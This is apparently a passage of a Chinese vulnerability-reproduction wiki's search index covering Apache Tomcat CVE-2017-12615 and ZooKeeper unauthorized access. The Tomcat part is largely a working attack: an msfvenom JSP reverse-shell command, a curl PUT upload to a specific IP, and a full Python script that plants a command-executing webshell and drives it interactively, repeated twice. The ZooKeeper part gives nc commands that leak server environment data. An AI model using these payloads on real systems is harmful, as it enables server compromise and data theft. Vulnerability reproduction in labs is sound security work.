File.getCanonicalPath\u7684\u4e00\u4e9b\u610f\u5916\u884c\u4e3a\u6240\u5bfc\u81f4\u3002\u5f53\u4f7f\u7528NTFS\u6587\u4ef6\u7cfb\u7edf\u65f6\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9b\u5b89\u5168\u9650\u5236\uff0c\u6700\u7ec8\u53ef\u5bfc\u81f4\u5982\u67e5\u770b\u67d0\u4e9b\u914d\u7f6e\u4e2dJSP\u7684\u6e90\u4ee3\u7801\u7b49\u5371\u5bb3\u3002 \u800c\u8865\u4e01\u4fee\u590d\u4e86 \u51fa\u73b0 : \u7684\u90e8\u5206 getCanonicalPath() \u6b64\u8def\u5f84\u65b9\u6cd5\u8fd4\u56de\u7edd\u5bf9\u552f\u4e00\u7684\u6807\u51c6\u89c4\u8303\u8def\u5f84\u540d\u3002\u6b64\u65b9\u6cd5\u9996\u5148\u5c06\u6b64\u8def\u5f84\u540d\u8f6c\u6362\u4e3a\u7edd\u5bf9\u5f62\u5f0f\uff0c\u5c31\u50cf\u8c03\u7528getAbsolutePath\u65b9\u6cd5\u4e00\u6837\uff0c\u7136\u540e\u4ee5\u7cfb\u7edf\u76f8\u5173\u7684\u65b9\u5f0f\u5c06\u5176\u6620\u5c04\u5230\u5176\u552f\u4e00\u8def\u5f84\u4e0a\u3002 \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u8def\u5f84\u4e2d\u5305\u542b\u201c.\u201d\u6216\u201c..\u201d\u7b49\u5f53\u524d\u8def\u5f84\u53ca\u4e0a\u5c42\u8def\u5f84\u8868\u793a\u6cd5\uff0c\u5219\u4f1a\u4ece\u8def\u5f84\u540d\u4e2d\u5220\u9664\u201c.\u201d\u548c\u201c..\u201d\u4f7f\u7528\u771f\u5b9e\u8def\u5f84\u4ee3\u66ff\u3002\u53e6\u5916\u6bd4\u8f83\u91cd\u70b9\u7684\u662f \u5b83\u8fd8\u4f1a\u89e3\u6790\u8f6f\u94fe\u63a5\uff08\u5728UNIX\u5e73\u53f0\u4e0a\uff09\u4ee5\u53ca\u5c06\u9a71\u52a8\u5668\u53f7\uff08\u5728Microsoft Windows\u5e73\u53f0\u4e0a\uff09\uff0c\u5c06\u5b83\u4eec\u8f6c\u6362\u4e3a\u6807\u51c6\u5b9e\u9645\u8def\u5f84\u3002 \u800c getCanonicalPath() \u89e3\u6790\u4e86\u8f6f\u94fe\u63a5\u8f6c\u6362\u4e3a\u5b9e\u9645\u8def\u5f84\u5bfc\u81f4\u6f0f\u6d1e\u7684\u4ea7\u751f","title":"\u76ee\u524d\u6f0f\u6d1e\u590d\u73b0\u6682\u672a\u5b8c\u5584"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/","text":"Apache Tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2017-12615 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2017\u5e749\u670819\u65e5\uff0cApache Tomcat\u5b98\u65b9\u786e\u8ba4\u5e76\u4fee\u590d\u4e86\u4e24\u4e2a\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5c31\u6709\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2017-12615)\u3002\u5f53 \u542f\u7528\u4e86HTTP PUT\u8bf7\u6c42\u65b9\u6cd5\uff08\u4f8b\u5982\uff0c\u5c06 readonly \u521d\u59cb\u5316\u53c2\u6570\u7531\u9ed8\u8ba4\u503c\u8bbe\u7f6e\u4e3a false\uff09\uff0c\u653b\u51fb\u8005\u5c06\u6709\u53ef\u80fd\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u653b\u51fb\u8bf7\u6c42\u6570\u636e\u5305\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u5305\u542b\u4efb\u610f\u4ee3\u7801\u7684 JSP \u6587\u4ef6\uff0cJSP\u6587\u4ef6\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u5c06\u80fd\u88ab\u670d\u52a1\u5668\u6267\u884c\u3002\u5bfc\u81f4\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u6cc4\u9732\u6216\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080/ \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u4ea7\u751f\u7684\u4e3b\u8981\u539f\u56e0\u6765\u81ea\u4e8e**conf/web.xml**\u6587\u4ef6\u914d\u7f6e\u9519\u8bef,readonly\u5f00\u542f\u4e86false,\u5bfc\u81f4\u53ef\u4ee5\u4f7f\u7528**PUT/DELETE**\u8bf7\u6c42\u65b9\u6cd5\u64cd\u4f5c\u6587\u4ef6 **msf**\u751f\u6210\u4e00\u4e2a**jsp**\u6728\u9a6c msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp \u5229\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6728\u9a6c curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] \u6ce8\u610f http://xxx.xxx.xxx.xxx:8080/shell.jsp/\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\"/\"\u5b57\u7b26\u5f88\u91cd\u8981 \u53d1\u73b0\u6210\u529f\u4e0a\u4f20\u6728\u9a6c\u6587\u4ef6 \u8bbf\u95ee\u6587\u4ef6\u5373\u53ef\u53cd\u5f39\u4e00\u4e2ashell \u4e5f\u53ef\u4ee5\u4f7f\u7528**DELETE**\u8bf7\u6c42\u65b9\u6cd5\u5220\u9664\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u4ee3\u7801\u53ea\u7528\u4e8e\u68c0\u6d4b\u6f0f\u6d1e\uff0c\u53cd\u5f39shell\u53c2\u7167\u4e0a\u65b9 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2017-12615.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell \\033 [0m' ) print ( '+ \\033 [36mCmd >>> exit(\u9000\u51fa\u4ea4\u4e92\u5e76\u5220\u9664webshell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): md5_filename = str ( random . randint ( 1 , 999 )) . encode ( \"utf-8\" ) file_name = hashlib . md5 ( md5_filename ) . hexdigest () vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } data = \"\"\" <% if(\"peiqi\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[1024]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %> \"\"\" try : response = requests . request ( \"PUT\" , url = vuln_put_url , data = data , headers = headers , timeout = 30 ) if response . status_code == 201 or response . status_code == 201 : print ( \" \\033 [32m[o] \u542b\u6709CVE-2017-12615\u6f0f\u6d1e\uff0c\u6210\u529f\u4e0a\u4f20shell\uff0c\u6587\u4ef6\u540d\u4e3a {} .jsp,\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( file_name , response . status_code )) return file_name else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,PUT\u65b9\u6cd5\u5173\u95ed \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,PUT\u65b9\u6cd5\u5173\u95ed \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , file_name , cmd ): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . get ( url = vuln_cmd_url , headers = headers , timeout = 30 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884c\u547d\u4ee4,\u54cd\u5e94\u4e3a: \\n\\033 [0m\" , response . text ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,\u547d\u4ee4\u65e0\u6cd5\u6267\u884c \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,\u547d\u4ee4\u65e0\u6cd5\u6267\u884c \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , file_name ): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . request ( \"DELETE\" , url = vuln_delect_url , headers = headers , timeout = 30 ) if response . status_code == 200 or 201 : print ( \" \\033 [32m[o] \u6210\u529f\u5220\u9664shell\uff0c\u6587\u4ef6\u540d\u4e3a {} .jsp,\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( file_name , response . status_code )) return file_name else : print ( \" \\033 [31m[x] \u5220\u9664\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u5220\u9664\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_name = POC_1 ( target_url ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : POC_3 ( target_url , file_name ) sys . exit ( 0 ) else : POC_2 ( target_url , file_name , cmd )","title":"Apache Tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2017-12615"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/#apache-tomcat-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2017-12615","text":"","title":"Apache Tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2017-12615"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2017\u5e749\u670819\u65e5\uff0cApache Tomcat\u5b98\u65b9\u786e\u8ba4\u5e76\u4fee\u590d\u4e86\u4e24\u4e2a\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5c31\u6709\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2017-12615)\u3002\u5f53 \u542f\u7528\u4e86HTTP PUT\u8bf7\u6c42\u65b9\u6cd5\uff08\u4f8b\u5982\uff0c\u5c06 readonly \u521d\u59cb\u5316\u53c2\u6570\u7531\u9ed8\u8ba4\u503c\u8bbe\u7f6e\u4e3a false\uff09\uff0c\u653b\u51fb\u8005\u5c06\u6709\u53ef\u80fd\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u653b\u51fb\u8bf7\u6c42\u6570\u636e\u5305\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u5305\u542b\u4efb\u610f\u4ee3\u7801\u7684 JSP \u6587\u4ef6\uff0cJSP\u6587\u4ef6\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u5c06\u80fd\u88ab\u670d\u52a1\u5668\u6267\u884c\u3002\u5bfc\u81f4\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u6cc4\u9732\u6216\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Tomcat 7.0.0 - 7.0.81","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080/ \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u4ea7\u751f\u7684\u4e3b\u8981\u539f\u56e0\u6765\u81ea\u4e8e**conf/web.xml**\u6587\u4ef6\u914d\u7f6e\u9519\u8bef,readonly\u5f00\u542f\u4e86false,\u5bfc\u81f4\u53ef\u4ee5\u4f7f\u7528**PUT/DELETE**\u8bf7\u6c42\u65b9\u6cd5\u64cd\u4f5c\u6587\u4ef6 **msf**\u751f\u6210\u4e00\u4e2a**jsp**\u6728\u9a6c msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp \u5229\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6728\u9a6c curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] \u6ce8\u610f http://xxx.xxx.xxx.xxx:8080/shell.jsp/\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\"/\"\u5b57\u7b26\u5f88\u91cd\u8981 \u53d1\u73b0\u6210\u529f\u4e0a\u4f20\u6728\u9a6c\u6587\u4ef6 \u8bbf\u95ee\u6587\u4ef6\u5373\u53ef\u53cd\u5f39\u4e00\u4e2ashell \u4e5f\u53ef\u4ee5\u4f7f\u7528**DELETE**\u8bf7\u6c42\u65b9\u6cd5\u5220\u9664\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12615/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u4ee3\u7801\u53ea\u7528\u4e8e\u68c0\u6d4b\u6f0f\u6d1e\uff0c\u53cd\u5f39shell\u53c2\u7167\u4e0a\u65b9 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2017-12615.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell \\033 [0m' ) print ( '+ \\033 [36mCmd >>> exit(\u9000\u51fa\u4ea4\u4e92\u5e76\u5220\u9664webshell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): md5_filename = str ( random . randint ( 1 , 999 )) . encode ( \"utf-8\" ) file_name = hashlib . md5 ( md5_filename ) . hexdigest () vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } data = \"\"\" <% if(\"peiqi\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[1024]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %> \"\"\" try : response = requests . request ( \"PUT\" , url = vuln_put_url , data = data , headers = headers , timeout = 30 ) if response . status_code == 201 or response . status_code == 201 : print ( \" \\033 [32m[o] \u542b\u6709CVE-2017-12615\u6f0f\u6d1e\uff0c\u6210\u529f\u4e0a\u4f20shell\uff0c\u6587\u4ef6\u540d\u4e3a {} .jsp,\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( file_name , response . status_code )) return file_name else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,PUT\u65b9\u6cd5\u5173\u95ed \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,PUT\u65b9\u6cd5\u5173\u95ed \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , file_name , cmd ): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . get ( url = vuln_cmd_url , headers = headers , timeout = 30 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884c\u547d\u4ee4,\u54cd\u5e94\u4e3a: \\n\\033 [0m\" , response . text ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,\u547d\u4ee4\u65e0\u6cd5\u6267\u884c \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,\u547d\u4ee4\u65e0\u6cd5\u6267\u884c \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , file_name ): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . request ( \"DELETE\" , url = vuln_delect_url , headers = headers , timeout = 30 ) if response . status_code == 200 or 201 : print ( \" \\033 [32m[o] \u6210\u529f\u5220\u9664shell\uff0c\u6587\u4ef6\u540d\u4e3a {} .jsp,\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( file_name , response . status_code )) return file_name else : print ( \" \\033 [31m[x] \u5220\u9664\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u5220\u9664\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_name = POC_1 ( target_url ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : POC_3 ( target_url , file_name ) sys . exit ( 0 ) else : POC_2 ( target_url , file_name , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ZooKeeper/Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/","text":"Apache ZooKeeper \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e CVE-2014-085 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9ed8\u8ba4\u5b89\u88c5\u914d\u7f6e\u5b8c\u7684zookeeper\u5141\u8bb8\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u672a\u914d\u7f6e\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08ACL\uff09\u3002\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u9ed8\u8ba4\u5f00\u653e\u76842181\u7aef\u53e3\u4e0b\u901a\u8fc7\u6267\u884cenvi\u547d\u4ee4\u83b7\u5f97\u5927\u91cf\u654f\u611f\u4fe1\u606f\uff08\u7cfb\u7edf\u540d\u79f0\u3001java\u73af\u5883\uff09\u5bfc\u81f4\u4efb\u610f\u7528\u6237\u53ef\u4ee5\u5728\u7f51\u7edc\u4e0d\u53d7\u9650\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u672a\u6388\u6743\u8bbf\u95ee\u8bfb\u53d6\u6570\u636e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache ZooKeeper \u6f0f\u6d1e\u590d\u73b0 \u00b6 Apache ZooKeeper \u9ed8\u8ba4\u5f00\u653e 2181\u7aef\u53e3 ,\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u83b7\u53d6\u654f\u611f\u6570\u636e echo envi | nc xxx.xxx.xxx.xxx 2181 \u5176\u4ed6\u4fe1\u606f 1 \u3001stat\uff1a\u5217\u51fa\u5173\u4e8e\u6027\u80fd\u548c\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 echo stat | ncat 127 .0.0.1 2181 2 \u3001ruok\uff1a\u6d4b\u8bd5\u670d\u52a1\u5668\u662f\u5426\u8fd0\u884c\u5728\u975e\u9519\u8bef\u72b6\u6001\u3002 echo ruok | ncat 127 .0.0.1 2181 3 \u3001reqs\uff1a\u5217\u51fa\u672a\u5b8c\u6210\u7684\u8bf7\u6c42\u3002 echo reqs | ncat 127 .0.0.1 2181 \u3000\u3000 4 \u3001envi\uff1a\u6253\u5370\u6709\u5173\u670d\u52a1\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 echo envi | ncat 127 .0.0.1 2181 \u3000\u3000 5 \u3001dump\uff1a\u5217\u51fa\u672a\u5b8c\u6210\u7684\u4f1a\u8bdd\u548c\u4e34\u65f6\u8282\u70b9\u3002 echo dump | ncat 127 .0.0.1 2181","title":"Apache ZooKeeper \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e CVE-2014-085"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ZooKeeper/Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/#apache--zookeeper-\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e-cve-2014-085","text":"","title":"Apache  ZooKeeper \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e CVE-2014-085"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ZooKeeper/Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9ed8\u8ba4\u5b89\u88c5\u914d\u7f6e\u5b8c\u7684zookeeper\u5141\u8bb8\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u672a\u914d\u7f6e\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08ACL\uff09\u3002\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u9ed8\u8ba4\u5f00\u653e\u76842181\u7aef\u53e3\u4e0b\u901a\u8fc7\u6267\u884cenvi\u547d\u4ee4\u83b7\u5f97\u5927\u91cf\u654f\u611f\u4fe1\u606f\uff08\u7cfb\u7edf\u540d\u79f0\u3001java\u73af\u5883\uff09\u5bfc\u81f4\u4efb\u610f\u7528\u6237\u53ef\u4ee5\u5728\u7f51\u7edc\u4e0d\u53d7\u9650\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u672a\u6388\u6743\u8bbf\u95ee\u8bfb\u53d6\u6570\u636e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ZooKeeper/Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache ZooKeeper","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ZooKeeper/Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/#\u6f0f\u6d1e\u590d\u73b0","text":"Apache ZooKeeper \u9ed8\u8ba4\u5f00\u653e 2181\u7aef\u53e3 ,\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u83b7\u53d6\u654f\u611f\u6570\u636e echo envi | nc xxx.xxx.xxx.xxx 2181 \u5176\u4ed6\u4fe1\u606f 1 \u3001stat\uff1a\u5217\u51fa\u5173\u4e8e\u6027\u80fd\u548c\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 echo stat | ncat 127 .0.0.1 2181 2 \u3001ruok\uff1a\u6d4b\u8bd5\u670d\u52a1\u5668\u662f\u5426\u8fd0\u884c\u5728\u975e\u9519\u8bef\u72b6\u6001\u3002 echo ruok | ncat 127 .0.0.1 2181 3 \u3001reqs\uff1a\u5217\u51fa\u672a\u5b8c\u6210\u7684\u8bf7\u6c42\u3002 echo reqs | ncat 127 .0.0.1 2181 \u3000\u3000 4 \u3001envi\uff1a\u6253\u5370\u6709\u5173\u670d\u52a1\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 echo envi | ncat 127 .0.0.1 2181 \u3000\u3000 5 \u3001dump\uff1a\u5217\u51fa\u672a\u5b8c\u6210\u7684\u4f1a\u8bdd\u548c\u4e34\u65f6\u8282\u70b9\u3002 echo dump | ncat 127 .0.0.1 